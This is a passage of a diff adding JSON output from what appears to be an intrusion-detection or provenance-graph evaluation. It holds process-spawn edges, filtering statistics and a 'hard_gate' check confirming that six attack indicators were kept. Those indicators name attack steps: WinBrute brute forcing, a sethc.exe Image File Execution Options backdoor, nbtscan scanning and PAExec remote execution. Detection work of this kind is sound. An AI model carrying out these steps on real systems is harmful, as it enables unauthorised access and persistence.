+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "6344_987788.8857",
+      "msec": "987788.8857"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "6712_1046306.9603",
+      "msec": "1046306.9603"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "2568_1053406.1014",
+      "msec": "1053406.1014"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "5488_1172728.4783",
+      "msec": "1172728.4783"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "1872_1172875.7866",
+      "msec": "1172875.7866"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "5176_1175403.9036",
+      "msec": "1175403.9036"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "6964_1178566.9360",
+      "msec": "1178566.9360"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "3532_1228330.8365",
+      "msec": "1228330.8365"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "1244_1231457.8259",
+      "msec": "1231457.8259"
+    },
+    {
+      "type": "spawned",
+      "from_node": "5896_3492657.6162",
+      "to_node": "5032_3492665.5761",
+      "msec": "3492665.5761"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "7132_3805717.3379",
+      "msec": "3805717.3379"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "2580_3805718.9510",
+      "msec": "3805718.9510"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3820_2342.5097",
+      "to_node": "6268_3806064.2733",
+      "msec": "3806064.2733"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3944_13606750.5803",
+      "to_node": "5196_13628046.6110",
+      "msec": "13628046.6110"
+    },
+    {
+      "type": "spawned",
+      "from_node": "6740_35557613.8539",
+      "to_node": "5408_35557831.1809",
+      "msec": "35557831.1809"
+    },
+    {
+      "type": "spawned",
+      "from_node": "6740_35557613.8539",
+      "to_node": "7104_35557833.2968",
+      "msec": "35557833.2968"
+    },
+    {
+      "type": "spawned",
+      "from_node": "7104_35557833.2968",
+      "to_node": "1684_35557926.1199",
+      "msec": "35557926.1199"
+    },
+    {
+      "type": "spawned",
+      "from_node": "5408_35557831.1809",
+      "to_node": "7116_35557928.0232",
+      "msec": "35557928.0232"
+    },
+    {
+      "type": "spawned",
+      "from_node": "7104_35557833.2968",
+      "to_node": "5944_35558014.7343",
+      "msec": "35558014.7343"
+    },
+    {
+      "type": "spawned",
+      "from_node": "5408_35557831.1809",
+      "to_node": "1728_35558225.3247",
+      "msec": "35558225.3247"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3528_35558375.2896",
+      "to_node": "6596_35558380.5304",
+      "msec": "35558380.5304"
+    },
+    {
+      "type": "spawned",
+      "from_node": "1488_50172027.5404",
+      "to_node": "6660_50172041.0118",
+      "msec": "50172041.0118"
+    },
+    {
+      "type": "spawned",
+      "from_node": "6660_50172041.0118",
+      "to_node": "7036_50172044.7003",
+      "msec": "50172044.7003"
+    },
+    {
+      "type": "spawned",
+      "from_node": "7036_50172044.7003",
+      "to_node": "3620_50172049.1826",
+      "msec": "50172049.1826"
+    },
+    {
+      "type": "spawned",
+      "from_node": "6660_50172041.0118",
+      "to_node": "5292_50172070.5231",
+      "msec": "50172070.5231"
+    },
+    {
+      "type": "spawned",
+      "from_node": "5292_50172070.5231",
+      "to_node": "6268_50172074.7990",
+      "msec": "50172074.7990"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4416_50262410.8667",
+      "to_node": "932_50262418.4645",
+      "msec": "50262418.4645"
+    },
+    {
+      "type": "spawned",
+      "from_node": "932_50262418.4645",
+      "to_node": "3840_50262426.9490",
+      "msec": "50262426.9490"
+    },
+    {
+      "type": "spawned",
+      "from_node": "7084_50263487.5294",
+      "to_node": "6880_50263494.9479",
+      "msec": "50263494.9479"
+    },
+    {
+      "type": "spawned",
+      "from_node": "6880_50263494.9479",
+      "to_node": "3636_50263501.0530",
+      "msec": "50263501.0530"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4920_50263583.7822",
+      "to_node": "2616_50263662.8629",
+      "msec": "50263662.8629"
+    },
+    {
+      "type": "spawned",
+      "from_node": "5736_50297903.8155",
+      "to_node": "4560_50297911.4129",
+      "msec": "50297911.4129"
+    },
+    {
+      "type": "spawned",
+      "from_node": "4560_50297911.4129",
+      "to_node": "6428_50297919.0280",
+      "msec": "50297919.0280"
+    },
+    {
+      "type": "spawned",
+      "from_node": "3352_50298559.7165",
+      "to_node": "5436_50298566.8859",
+      "msec": "50298566.8859"
+    },
+    {
+      "type": "spawned",
+      "from_node": "5436_50298566.8859",
+      "to_node": "4320_50298572.5342",
+      "msec": "50298572.5342"
+    },
+    {
+      "type": "spawned",
+      "from_node": "5436_50298566.8859",
+      "to_node": "1796_50298574.9888",
+      "msec": "50298574.9888"
+    },
+    {
+      "type": "spawned",
+      "from_node": "6640_50612413.6821",
+      "to_node": "7156_50612421.2839",
+      "msec": "50612421.2839"
+    },
+    {
+      "type": "spawned",
+      "from_node": "7156_50612421.2839",
+      "to_node": "3556_50612454.0614",
+      "msec": "50612454.0614"
+    },
+    {
+      "type": "spawned",
+      "from_node": "7156_50612421.2839",
+      "to_node": "5300_50612480.3740",
+      "msec": "50612480.3740"
+    },
+    {
+      "type": "spawned",
+      "from_node": "6276_50612721.7533",
+      "to_node": "6632_50612728.8923",
+      "msec": "50612728.8923"
+    },
+    {
+      "type": "spawned",
+      "from_node": "6632_50612728.8923",
+      "to_node": "2092_50612781.1046",
+      "msec": "50612781.1046"
+    },
+    {
+      "type": "spawned",
+      "from_node": "6632_50612728.8923",
+      "to_node": "6284_50612782.0754",
+      "msec": "50612782.0754"
+    },
+    {
+      "type": "spawned",
+      "from_node": "5084_50868691.4095",
+      "to_node": "6764_50868698.7697",
+      "msec": "50868698.7697"
+    },
+    {
+      "type": "spawned",
+      "from_node": "6764_50868698.7697",
+      "to_node": "2096_50868702.6544",
+      "msec": "50868702.6544"
+    },
+    {
+      "type": "spawned",
+      "from_node": "2096_50868702.6544",
+      "to_node": "3284_50868707.0839",
+      "msec": "50868707.0839"
+    },
+    {
+      "type": "spawned",
+      "from_node": "6244_50937202.0779",
+      "to_node": "6204_50937209.4422",
+      "msec": "50937209.4422"
+    },
+    {
+      "type": "spawned",
+      "from_node": "6204_50937209.4422",
+      "to_node": "924_50937214.0426",
+      "msec": "50937214.0426"
+    },
+    {
+      "type": "spawned",
+      "from_node": "1324_50937346.8600",
+      "to_node": "1444_50937355.8575",
+      "msec": "50937355.8575"
+    },
+    {
+      "type": "spawned",
+      "from_node": "1444_50937355.8575",
+      "to_node": "5080_50937361.1943",
+      "msec": "50937361.1943"
+    },
+    {
+      "type": "spawned",
+      "from_node": "1144_51007158.9857",
+      "to_node": "6680_51007166.3185",
+      "msec": "51007166.3185"
+    },
+    {
+      "type": "spawned",
+      "from_node": "288_51007232.0561",
+      "to_node": "704_51007238.9483",
+      "msec": "51007238.9483"
+    },
+    {
+      "type": "spawned",
+      "from_node": "704_51007238.9483",
+      "to_node": "4252_51007242.5569",
+      "msec": "51007242.5569"
+    }
+  ],
+  "stats": {
+    "total_events": 1087311,
+    "process_start_seen": 3139,
+    "tcpip_seen": 54507,
+    "tcpip_kept_external": 31971,
+    "fileio_write_seen": 102637,
+    "fileio_write_kept_suspicious": 3335,
+    "raw_process_nodes": 3139,
+    "candidate_nodes": 234,
+    "candidate_edges": 255,
+    "pid_reuse_collisions": 0,
+    "repeat_collapsed": 2905,
+    "raw_connected_to_events": 31971,
+    "deduped_connected_to_edges": 79,
+    "raw_wrote_events": 3335,
+    "deduped_wrote_edges": 24
+  },
+  "hard_gate": {
+    "passed": true,
+    "checked": 6,
+    "survived": 6,
+    "missing": [],
+    "explained_missing": {},
+    "unscoreable": [],
+    "results": [
+      {
+        "id": "A1",
+        "match_substring": "ping www.baidu.com -c 1",
+        "found": true,
+        "expected_exception": null
+      },
+      {
+        "id": "A2",
+        "match_substring": "sangforcat.exe",
+        "found": true,
+        "expected_exception": null
+      },
+      {
+        "id": "A3",
+        "match_substring": "WinBrute.exe",
+        "found": true,
+        "expected_exception": null
+      },
+      {
+        "id": "A4",
+        "match_substring": "Execution Options\\sethc.exe",
+        "found": true,
+        "expected_exception": null
+      },
+      {
+        "id": "A5",
+        "match_substring": "nbtscan.exe",
+        "found": true,
+        "expected_exception": null
+      },
+      {
+        "id": "A6",
+        "match_substring": "PAExec.exe \\\\192.168.0.244",
+        "found": true,
+        "expected_exception": null
+      }
+    ]
+  }
+}
